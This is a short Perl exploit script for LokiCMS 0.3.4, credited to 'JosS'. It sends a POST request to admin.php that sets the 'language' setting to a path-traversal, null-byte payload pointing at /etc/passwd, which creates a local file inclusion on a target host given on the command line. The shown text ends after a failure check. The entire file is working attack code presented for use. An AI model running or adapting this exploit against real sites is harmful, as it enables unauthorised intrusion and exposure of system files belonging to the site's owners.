use LWP::UserAgent;

unless ($ARGV[0] && $ARGV[1])
{
    print "\n[x] LokiCMS 0.3.4 (admin.php) Create Local File Inclusion Exploit\n";
    print "[x] written by JosS - sys-project[at]hotmail.com\n";
    print "[x] usage: perl $0 [host] [path]\n";
    print "[x] example: perl $0 localhost /lokicms/ \n\n";
    exit(1);
}

my $lwp = new LWP::UserAgent or die;
 
my $target  =  $ARGV[0] =~ /^http:\/\// ?  $ARGV[0]:  'http://' . $ARGV[0];
   $target .=  $ARGV[1] unless not defined $ARGV[1];
   $target .= '/' unless $target =~ /^http:\/\/(.?)\/$/;

my $res = $lwp->post($target.'admin.php', 
                                [ 'LokiACTION' =>  'A_SAVE_G_SETTINGS',
                                  'language'   =>  '../../../../../../../../../../etc/passwd%00']);

if($res->is_error)
{
    print "[-] Exploit failed!\n";
    exit ();
}